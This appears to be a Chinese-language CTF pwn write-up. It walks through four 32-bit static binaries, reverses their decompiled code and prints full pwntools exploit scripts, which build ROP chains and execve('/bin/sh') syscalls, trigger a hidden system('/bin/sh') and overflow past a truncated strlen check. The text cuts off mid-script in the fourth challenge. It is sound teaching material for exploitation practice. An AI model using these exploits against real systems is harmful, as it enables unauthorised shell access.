class="line"></span><br><span class="line">  v2 = v3;</span><br><span class="line">  v3 = a1;</span><br><span class="line">  sub_8049200(sub_804890C, v2, &amp;retaddr, sub_80495D0, sub_8049670, a2, &amp;v3);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>根据以往的经验分析 sub_8049200应该是libc_start_main函数</p><p>那么作为其rdi参数的sub_804890C应该是main函数了</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> __noreturn <span class="title function_">sub_804890C</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  sub_804887C();</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">    sub_80488CE();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>跟进以后 可以看到不像是libc函数 为出题人编写的 所以猜测正确 为main函数 接下来分别跟进两个函数</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">sub_804887C</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  sub_80511E0(off_80EB4BC, <span class="number">0</span>);</span><br><span class="line">  sub_80511E0(off_80EB4B8, <span class="number">0</span>);</span><br><span class="line">  sub_80511E0(off_80EB4B4, <span class="number">0</span>);</span><br><span class="line">  <span class="keyword">return</span> sub_806D410(<span class="number">300</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>三个一样的函数 对.data段上三个相邻的参数进行操作 并且第二个参数还是0 这怎么看都是清空缓存区 用的setbuf函数嘛</p><p>至于最后的函数调用 我猜是alarm闹钟函数 毕竟有个300的参数</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">sub_80488CE</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> v1[<span class="number">104</span>]; <span class="comment">// [esp+0h] [ebp-68h] BYREF</span></span><br><span class="line"></span><br><span class="line">  sub_804F4C0(<span class="string">&quot;please input what you want say&quot;</span>);</span><br><span class="line">  sub_806DDA0(<span class="number">0</span>, v1, <span class="number">256</span>);</span><br><span class="line">  <span class="keyword">return</span> sub_804F9D0(v1);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个函数应该就是漏洞点了   sub_804F4C0函数要么是printf要么是puts 直接运行程序并没有输出换行符 那么应该是printf</p><p>sub_806DDA0看参数应该是read函数 最后的sub_804F9D0函数经过直接运行程序猜测是puts函数</p><p><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202304201315858.png" title="image-20230420131455799" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202304201315858.png" alt="image-20230420131455799"></a></p><p>那么至此程序的主要逻辑就明了了   while重复执行sub_80488CE函数 该函数存在栈溢出漏洞</p><p>再加上是静态编译 那么此时直接利用ROPgadget自带的构造rop链 getshell</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ROPgadget --binary pwn --ropchain</span><br></pre></td></tr></table></figure><p>完整exp:</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> struct <span class="keyword">import</span> *</span><br><span class="line">io = process(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line"><span class="comment">#io = remote(&quot;node.yuzhian.com.cn&quot;,32980)</span></span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>,<span class="string">&#x27;splitw&#x27;</span>,<span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line"><span class="comment">#libc = ELF(&quot;/home/chen/glibc-all-in-one/libs/2.31-0ubuntu9.9_amd64/libc-2.31.so&quot;)</span></span><br><span class="line"><span class="comment">#libc = cdll.LoadLibrary(&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;)</span></span><br><span class="line"><span class="comment"># context.arch = &quot;i386&quot;</span></span><br><span class="line">context.arch = <span class="string">&quot;amd64&quot;</span></span><br><span class="line">elf = ELF(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug</span>():</span><br><span class="line">    gdb.attach(io)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&quot;please input what you want say&quot;</span>)</span><br><span class="line">p = <span class="string">b&#x27;a&#x27;</span> * (<span class="number">0x68</span>+<span class="number">4</span>)</span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0806f83b</span>) <span class="comment"># pop edx ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080eb060</span>) <span class="comment"># @ .data</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080b8eb6</span>) <span class="comment"># pop eax ; ret</span></span><br><span class="line">p += <span class="string">b&#x27;/bin&#x27;</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0805502b</span>) <span class="comment"># mov dword ptr [edx], eax ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0806f83b</span>) <span class="comment"># pop edx ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080eb064</span>) <span class="comment"># @ .data + 4</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080b8eb6</span>) <span class="comment"># pop eax ; ret</span></span><br><span class="line">p += <span class="string">b&#x27;//sh&#x27;</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0805502b</span>) <span class="comment"># mov dword ptr [edx], eax ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0806f83b</span>) <span class="comment"># pop edx ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080eb068</span>) <span class="comment"># @ .data + 8</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080495a3</span>) <span class="comment"># xor eax, eax ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0805502b</span>) <span class="comment"># mov dword ptr [edx], eax ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080481c9</span>) <span class="comment"># pop ebx ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080eb060</span>) <span class="comment"># @ .data</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080df8bd</span>) <span class="comment"># pop ecx ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080eb068</span>) <span class="comment"># @ .data + 8</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0806f83b</span>) <span class="comment"># pop edx ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080eb068</span>) <span class="comment"># @ .data + 8</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080495a3</span>) <span class="comment"># xor eax, eax ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0807b2f6</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0807b2f6</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0807b2f6</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0807b2f6</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0807b2f6</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0807b2f6</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0807b2f6</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0807b2f6</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0807b2f6</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0807b2f6</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0807b2f6</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0806d443</span>) <span class="comment"># int 0x80</span></span><br><span class="line">success(<span class="string">&quot;len :&quot;</span>+<span class="built_in">hex</span>(<span class="built_in">len</span>(p)))</span><br><span class="line">io.sendline(p)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h1 id="pwn2"><a href="#pwn2" class="headerlink" title="pwn2"></a>pwn2</h1><p><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202304201716530.png" title="image-20230420171633445" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202304201716530.png" alt="image-20230420171633445"></a></p><p>还是跟上题一样 保护基本没开 静态编译32位</p><p>老规矩 还是跟着start函数索引到main函数</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">sub_80488CE</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v0; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">char</span> v2; <span class="comment">// [esp-Ch] [ebp-24h]</span></span><br><span class="line">  <span class="type">int</span> v3; <span class="comment">// [esp+Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  sub_804887C();</span><br><span class="line">  v3 = sub_8059F50(<span class="number">48</span>);</span><br><span class="line">  sub_8048987(v3, <span class="number">48</span>);</span><br><span class="line">  v0 = sub_804DBD0(v3 + <span class="number">16</span>) + <span class="number">5</span>;</span><br><span class="line">  <span class="keyword">if</span> ( v0 == <span class="number">8</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    sub_8048987(v3, <span class="number">48</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> ( v0 &gt; <span class="number">8</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( v0 == <span class="number">10</span> )</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> ( v0 == <span class="number">85145</span> )</span><br><span class="line">      sub_804F700(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> ( v0 == <span class="number">6</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    sub_804FA00(<span class="string">&quot;where is shell&quot;</span>, v2);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>第一个涉及到的函数</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">sub_804887C</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  sub_8051720(off_80EB4BC, <span class="number">0</span>);</span><br><span class="line">  sub_8051720(off_80EB4B8, <span class="number">0</span>);</span><br><span class="line">  sub_8051720(off_80EB4B4, <span class="number">0</span>);</span><br><span class="line">  <span class="keyword">return</span> sub_806D9C0(<span class="number">300</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>很明显是setbuf清空缓存区</p><p>第二个函数 参数是一个数值 并且在函数最后找到了这样一行字符串</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> ( v4 != _EBX )</span><br><span class="line">  sub_8056280(<span class="string">&quot;__libc_malloc&quot;</span>);</span><br></pre></td></tr></table></figure><p>所以大胆猜测是malloc 随后断点打在call 后 观察eax是否为堆地址返回值 成功验证猜想</p><p><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202304201723007.png" title="image-20230420172357977" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202304201723007.png" alt="image-20230420172357977"></a></p><p>至于第三个函数 看参数没有多少印象 所以觉得是出题人自己编写的函数 还得跟进一下看实现逻辑</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">sub_8048987</span><span class="params">(<span class="type">int</span> a1, <span class="type">int</span> a2)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [esp+Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; a2 - <span class="number">1</span> &gt; i; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( sub_806E380(<span class="number">0</span>, i + a1, <span class="number">1</span>) != <span class="number">1</span> )</span><br><span class="line">      sub_804E660(<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">if</span> ( *(_BYTE *)(i + a1) == <span class="number">10</span> )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  *(_BYTE *)(i + a1) = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">return</span> i;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>sub_806E380函数的参数构造有点像read  sub_804E660的参数构造像exit函数</p><p>那么结合函数整体的逻辑 我认为是一个往刚刚申请的chunk中读入数据的函数 当读入的字符为\n时  结束读入 并且把\n字符所处的位置设置为\x00</p><p>接下来第四个函数应该是最关键的了  从main函数的逻辑来看 这个函数的返回值将决定是否能够触发system(“&#x2F;bin&#x2F;sh”)</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">sub_804DBD0</span><span class="params">(<span class="type">int</span> a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">return</span> sub_804E880(a1, <span class="number">0</span>, <span class="number">10</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>内部还调用了一个函数 不过这个函数的参数就有点眼熟了  a1是chunk的用户块+0x10处的地址 第二个参数为0</p><p>第三个参数是10  有点像strtol函数 为了印证猜想 看看函数结束后的eax寄存器是不是预期返回值</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload = cyclic(<span class="number">0x10</span>)+<span class="string">b&#x27;85140&#x27;</span></span><br></pre></td></tr></table></figure><p><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202304202051606.png" title="image-20230420205112566" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202304202051606.png" alt="image-20230420205112566"></a></p><p>之所以多了5 是因为在v0的值是strtol函数的返回值+5</p><p>那么就会进入对应的if判断式 直接调用system(“&#x2F;bin&#x2F;sh”)</p><p>至于最后的函数 实在是猜不出来 最后用sig文件解析了一下 再加上chatgpt 大概了解到其是一个可以直接把字符串输出到标准输出流的函数</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">sub_804FA00</span><span class="params">(<span class="type">int</span> a1, ...)</span></span><br><span class="line">&#123;</span><br><span class="line">  va_list va; <span class="comment">// [esp+14h] [ebp+8h] BYREF</span></span><br><span class="line"></span><br><span class="line">  va_start(va, a1);</span><br><span class="line">  <span class="keyword">return</span> _IO_vfprintf_internal(off_80EB4B8, a1, (<span class="type">char</span> *)va);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>exp：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> struct <span class="keyword">import</span> *</span><br><span class="line">io = process(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line"><span class="comment">#io = remote(&quot;node.yuzhian.com.cn&quot;,32980)</span></span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>,<span class="string">&#x27;splitw&#x27;</span>,<span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line"><span class="comment">#libc = ELF(&quot;/home/chen/glibc-all-in-one/libs/2.31-0ubuntu9.9_amd64/libc-2.31.so&quot;)</span></span><br><span class="line"><span class="comment">#libc = cdll.LoadLibrary(&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;)</span></span><br><span class="line"><span class="comment"># context.arch = &quot;i386&quot;</span></span><br><span class="line">context.arch = <span class="string">&quot;amd64&quot;</span></span><br><span class="line">elf = ELF(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug</span>():</span><br><span class="line">    gdb.attach(io)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line">payload = cyclic(<span class="number">0x10</span>)+<span class="string">b&#x27;85140&#x27;</span></span><br><span class="line"><span class="comment"># gdb.attach(io,&#x27;b *0x8048935&#x27;)</span></span><br><span class="line"><span class="comment"># pause(0)</span></span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h1 id="pwn3"><a href="#pwn3" class="headerlink" title="pwn3"></a>pwn3</h1><p>一开始还以为是个手写可见字符shellcode 但是转念一想 反正保护全关 也有很长的栈溢出 那就可以直接打呗</p><p>静态编译的程序一般都是打系统调用的 这里太久没做了 还卡住了 忘记32位的系统调用是int 0x80了 傻傻的用syscall打了半天</p><p><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202305161330928.png" title="image-20230516133039836" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202305161330928.png" alt="image-20230516133039836"></a></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl __noreturn <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  init();</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">    vuln();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">vuln</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v0; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">char</span> v2[<span class="number">96</span>]; <span class="comment">// [esp+8h] [ebp-70h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> j; <span class="comment">// [esp+68h] [ebp-10h]</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [esp+6Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;please input what you want say&quot;</span>);</span><br><span class="line">  read_len = read(<span class="number">0</span>, v2, <span class="number">288</span>);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; read_len; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">for</span> ( j = <span class="number">0</span>; ; ++j )</span><br><span class="line">    &#123;</span><br><span class="line">      v0 = <span class="built_in">strlen</span>(byte_80EB068);</span><br><span class="line">      <span class="keyword">if</span> ( v0 &lt;= j )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">if</span> ( v2[i] == *(j + <span class="number">0x80EB068</span>) )</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(v2);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>对于输入的字符进行了一个检查 如果为BINSHbinsh就exit</p><p>不过不影响 直接构造rop链 往bss段写binsh 随后execve系统调用就好了</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line">io = process(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line"><span class="comment">#io = remote(&quot;node5.anna.nssctf.cn&quot;,28881)</span></span><br><span class="line">elf = ELF(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>,<span class="string">&#x27;splitw&#x27;</span>,<span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line"><span class="comment">#libc = ELF(&quot;./ld-linux.so.2&quot;)</span></span><br><span class="line">libc = ELF(<span class="string">&quot;/home/chen/glibc-all-in-one/libs/2.35-0ubuntu3.1_amd64/libc.so.6&quot;</span>)</span><br><span class="line"><span class="comment">#libc = cdll.LoadLibrary(&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;)</span></span><br><span class="line">context.arch = <span class="string">&quot;amd64&quot;</span></span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug</span>():</span><br><span class="line">    gdb.attach(io)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&quot;please input what you want say&quot;</span>)</span><br><span class="line">edi_addr = <span class="number">0x08048480</span></span><br><span class="line">eax_addr = <span class="number">0x080b8f16</span></span><br><span class="line">ebx_addr = <span class="number">0x080481c9</span></span><br><span class="line">ecx_addr = <span class="number">0x080df91d</span> </span><br><span class="line">edx_addr = <span class="number">0x0806f89b</span></span><br><span class="line">syscall_addr = <span class="number">0x0806331d</span></span><br><span class="line">sh_addr=  <span class="number">0x80EB070</span></span><br><span class="line">bss_addr = elf.bss(<span class="number">0x400</span>)</span><br><span class="line">read_addr = <span class="number">0x806DE00</span></span><br><span class="line">main_addr = <span class="number">0x8048972</span></span><br><span class="line">int80_addr =<span class="number">0x0806d4a3</span></span><br><span class="line">payload = <span class="string">b&#x27;e&#x27;</span>*<span class="number">0x74</span>+p32(read_addr)+p32(main_addr)+p32(<span class="number">0</span>)+p32(bss_addr)+p32(<span class="number">0x20</span>)</span><br><span class="line"><span class="comment"># gdb.attach(io,&#x27;b *0x8048971 &#x27;)</span></span><br><span class="line"><span class="comment"># pause(0)</span></span><br><span class="line">io.send(payload)</span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line">io.send(<span class="string">b&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">io.recvuntil(<span class="string">&quot;please input what you want say&quot;</span>)</span><br><span class="line">payload = <span class="string">b&#x27;e&#x27;</span>*<span class="number">0x74</span>+p32(eax_addr)+p32(<span class="number">0xb</span>)+p32(ebx_addr)+p32(bss_addr)+p32(ecx_addr)+p32(<span class="number">0</span>)+p32(int80_addr)</span><br><span class="line"><span class="comment"># gdb.attach(io,&#x27;b *0x8048971 &#x27;)</span></span><br><span class="line"><span class="comment"># pause(0)</span></span><br><span class="line">io.send(payload)</span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h1 id="pwn4"><a href="#pwn4" class="headerlink" title="pwn4"></a>pwn4</h1><p>依然是什么保护都没有开</p><p><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202305162134515.png" title="image-20230516213436431" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202305162134515.png" alt="image-20230516213436431"></a></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl __noreturn <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  init();</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">    vuln();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">vuln</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> v1[<span class="number">336</span>]; <span class="comment">// [esp+0h] [ebp-1B8h] BYREF</span></span><br><span class="line">  <span class="type">char</span> v2[<span class="number">104</span>]; <span class="comment">// [esp+150h] [ebp-68h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;please input your username&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, v2, <span class="number">0x20</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;please input your passwd&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, v1, <span class="number">0x14F</span>);</span><br><span class="line">  <span class="keyword">return</span> check(v1);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>没有栈溢出 v1作为check函数的参数 跟进一下</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">check</span><span class="params">(<span class="type">int</span> a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> result; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">char</span> v2[<span class="number">16</span>]; <span class="comment">// [esp+Fh] [ebp-19h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int8 v3; <span class="comment">// [esp+1Fh] [ebp-9h]</span></span><br><span class="line"></span><br><span class="line">  v3 = <span class="built_in">strlen</span>(a1);</span><br><span class="line">  <span class="keyword">if</span> ( v3 &gt; <span class="number">6u</span> &amp;&amp; v3 &lt;= <span class="number">8u</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;nice&quot;</span>);</span><br><span class="line">    result = <span class="built_in">strcpy</span>(v2, a1);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;passwd error&quot;</span>);</span><br><span class="line">    result = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>针对v1的长度进行了检测 只有7和8的时候可以调用strcpy进行栈溢出 这里一开始想的是直接\x00绕过strlen 后来意识到strcpy也会被绕过 这个时候注意到v3这个参数的异常 你可以发现其位于ebp-0x9 这个位置有点不对劲 所以切换成汇编看一下</p><p><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202305162138395.png" title="image-20230516213802362" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202305162138395.png" alt="image-20230516213802362"></a></p><p>strlen的返回值存储在eax中 而用来比较的是al寄存器的值 所以这里可以绕过</p><p>原因就在于如果数值大一点 使得二进制形式的eax的1都位于高位 使得低八位的值比较小 就可以绕过了</p><p>完整exp:</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line">io = process(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line"><span class="comment">#io = remote(&quot;node5.anna.nssctf.cn&quot;,28881)</span></span><br><span class="line">elf = ELF(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>,<span class="string">&#x27;splitw&#x27;</span>,<span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line"><span class="comment">#libc = ELF(&quot;./ld-linux.so.2&quot;)</span></span><br><span class="line">libc = ELF(<span class="string">&quot;/home/chen/glibc-all-in-one/libs/2.35-0ubuntu3.1_amd64/libc.so.6&quot;</span>)</span><br><span class="line"><span class="comment">#libc = cdll.LoadLibrary(&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;)</span></span><br><span class="line">context.arch = <span class="string">&quot;amd64&quot;</span></span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug</span>():</span><br><span class="line">    gdb.attach(io)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&quot;please input your username&quot;</span>)</span><br><span class="line">io.send(<span class="string">b&#x27;chen&#x27;</span>)</span><br><span class="line">io.recvuntil(<span class="string">&quot;please input your passwd&quot;</span>)</span><br><span class="line">backdoor_addr = <span class="number">0x80488CE</span></span><br><span class="line">payload = cyclic(<span class="number">0x19</span>+<span class="number">0x4</span>)+p32(backdoor_addr)+cyclic(<span class="number">0xe6</span>)</span><br><span class="line"><span class="comment"># gdb.attach(io,&#x27;b *0x80488FB&#x27;)</span></span><br><span class="line"><span class="comment"># 